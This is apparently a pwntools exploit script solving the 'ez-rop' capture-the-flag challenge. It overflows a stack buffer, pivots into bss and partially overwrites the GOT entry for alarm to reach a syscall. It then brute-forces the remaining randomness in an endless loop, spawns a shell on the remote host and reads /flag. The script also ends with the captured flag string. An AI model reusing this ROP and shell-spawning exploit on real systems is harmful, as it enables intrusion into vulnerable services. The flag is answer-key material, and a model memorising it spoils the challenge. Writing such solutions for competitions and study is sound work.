#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

DOCKER_PORT = 1337
REMOTE_NC_CMD    = "nc ez-rop.challs.csc.tf 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b vuln
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main(random):
    r = conn()
    
    rop = ROP(exe)

    payload = b"A"*0x60 + p64(exe.bss(0x900)) + p64(0x000000000040119a) + b"A"*2 #vuln+8
    r.sendline(payload)

    rbp = 0
    #0x0000000000401165: pop rsi; ret;  
    #0x000000000040115a: mov rdi, rsi; ret; 
    POP_RSI = 0x0000000000401165
    MOV_RDI_RSI = 0x000000000040115a

    rbp = p64(exe.got.alarm + 8)
    rop.raw(0x401172) 
    rop.rsi=0
    rop.rbp = exe.bss(0x800)
    rop.raw(exe.plt.alarm)
   
    execve = p64(exe.plt.setbuf) + p64(0x3b)*4 + p64(exe.plt.setbuf) + p64(0x3b)*4 + p64(exe.plt.alarm)
    sleep(0.5)
    r.sendline(rbp + rop.chain().ljust(0x58, b"A") + p64(exe.bss(0x900)-0x60) + p64(rop.leave.address))
    #gdb.attach(r)
    sleep(0.5)
    r.send((random*0x10+8).to_bytes(1, 'little') + b"\xbc")
    sleep(0.5)
    r.sendline(b"ls")
    r.sendline(b"cat /flag")
    r.sendline(b"exit")
    print(r.recvall())
    #CSCTF{ez_rop_bc6680c1a0d13d778d73c59185b1e412}

if __name__ == "__main__":
    i=0
    
    while True:
        try:
            i+=1
            main(i%16)
        except:
            continue